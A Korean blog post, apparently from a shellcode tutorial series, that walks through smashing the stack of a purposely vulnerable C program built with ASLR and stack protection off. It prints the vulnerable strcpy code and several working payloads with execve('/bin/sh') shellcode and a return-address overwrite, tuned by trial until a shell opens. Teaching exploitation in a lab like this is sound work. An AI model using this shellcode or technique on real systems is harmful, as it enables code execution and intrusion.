---
layout: post
title: "Linux x86_64 Shellcode 5"
date: 2014-11-10 22:26:30 +0900
comments: true
categories: 
---

##### vic.c 

이제 vulnerable 한 실행화일을 외부에서 exploit 해보자.

일단 우분투에서 `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` 커맨드로 ASLR 을 끄고, `-fno-stack-protector -z execstack` 으로 취약한 executable 을 만든다.

    unsigned long esp(void)
    {
        __asm__("mov %rsp,%rax");
    }
    void main(int ac, char **av)
    {
        char arr[512];
        if (ac > 1) {
            printf("address of arr: %lx\n",&arr);
            printf("esp: %lx\n",esp());
            strcpy(arr, av[1]);
        }
    }

    # echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
    $ gcc -fno-stack-protector -z execstack -o vic vic.c

##### Smash!

이제 터뜨려본다.

    z@ubuntu:~/shell$ ./vic $(printf "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05%0480x\x70\xdc\xff\xff\xff\x7f\x00\x00" 0)
    address of arr: 7fffffffdc70
    esp: 7fffffffdc50
    z@ubuntu:~/shell$

arr 의 주소는 `0x7fffffffdc70` 이었다. 아무일 없다.

482 시도

    z@ubuntu:~/shell$ ./vic $(printf "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05%0482x\x60\xdc\xff\xff\xff\x7f\x00\x00" 0)
    address of arr: 7fffffffdc60
    esp: 7fffffffdc40
    Segmentation fault (core dumped)

이번에는 arr 의 주소가 `0x7fffffffdc60` 으로 바뀌었다. 
coredump 가 난다. 
`return address` 를 `0x007fffffffdc60` 으로 overwrite 하기로 한다. arg 의 마지막을 `\x60\xdc\xff\xff\xff\x7f\x00\x00` 로 맞춰준다. arg 의 첫부분은 shellcode 로 맞춰준다. 가운데의 `\%0482x` 으로 길이를 조절한다.

485 시도

    z@ubuntu:~/shell$ ./vic $(printf "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05%0485x\x60\xdc\xff\xff\xff\x7f\x00\x00" 0)
    address of arr: 7fffffffdc60
    esp: 7fffffffdc40
    Segmentation fault (core dumped)

486 시도

    z@ubuntu:~/shell$ ./vic $(printf "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05%0486x\x60\xdc\xff\xff\xff\x7f\x00\x00" 0)
    address of arr: 7fffffffdc60
    esp: 7fffffffdc40
    Segmentation fault (core dumped)

487 시도

    z@ubuntu:~/shell$ ./vic $(printf "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05%0487x\x60\xdc\xff\xff\xff\x7f\x00\x00" 0)
    address of arr: 7fffffffdc60
    esp: 7fffffffdc40
    $

터졌다.

code 를 수정해, rbp,rsp, arr 를 덤프해서 주소들을 비교해보았다.

    z@ubuntu:~/shell$ ./vic $(printf "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05%0487x\x60\xdc\xff\xff\xff\x7f\x00\x00" 0)
    address of arr: 7fffffffdc60 <- main 에 있는 arr 주소
    rsp: 7fffffffdc40 <- subfunction 의 %rsp
    arr dump: <- arr 에 shellcode 가 제대로 적재되었는가?
    48 <- xor %rdx,%rdx
    31
    d2
    got it! 7fffffffde68 <- \x60\xdc\xff\xff\xff\x7f\x00\x00 이 있는 주소
    7fffffffde60: 3030303030303030 <- saved %rbp 가 '0' 으로 뭉개졌다
    7fffffffde68: 00007fffffffdc60 <- address of arr 로 overwrite 되었다
    7fffffffde70: 0000000000000000
    7fffffffde78: 00007fffffffdf48
    7fffffffde60: 00007fffffffde60 <- %rbp 를 덤프해보았다
    $ 

    00007fffffffde68 <- return address of main()
    00007fffffffde60 <- %rbp
    00007fffffffdc60 <- start of 'arr' (0x200 bytes)
    00007fffffffdc40 <- subfunction frame 이 셋업되고 그 %rsp

##### 참고

* [How can I temporarily disable ASLR (Address space layout randomization)?](http://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization)
* [Disabling Stack Smashing Protection in Ubuntu 11.04](http://stackoverflow.com/questions/5863252/disabling-stack-smashing-protection-in-ubuntu-11-04)
* [Why is execstack required to execute code on the heap?](http://stackoverflow.com/questions/23276488/why-is-execstack-required-to-execute-code-on-the-heap)
* [Stack Smashing On A Modern Linux System](http://www.exploit-db.com/papers/24085/)
